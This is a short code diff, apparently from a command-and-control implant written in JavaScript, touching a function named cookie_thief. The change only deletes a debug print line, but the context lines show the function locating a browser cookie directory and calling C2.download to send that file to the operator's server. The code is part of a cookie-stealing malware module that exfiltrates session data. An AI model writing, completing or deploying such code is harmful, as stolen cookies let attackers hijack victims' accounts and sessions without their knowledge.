@@ -31,9 +31,6 @@ exports.cookie_thief = function(task, command, params){
     }
     cookieDLPath = cookiepath + cookiedir;
 
-    //DEBUG
-    console.log(cookieDLPath)
-
     try{
         cookieDL_status = C2.download(task, cookieDLPath);
     	  if(cookieDL_status.hasOwnProperty("file_id")){
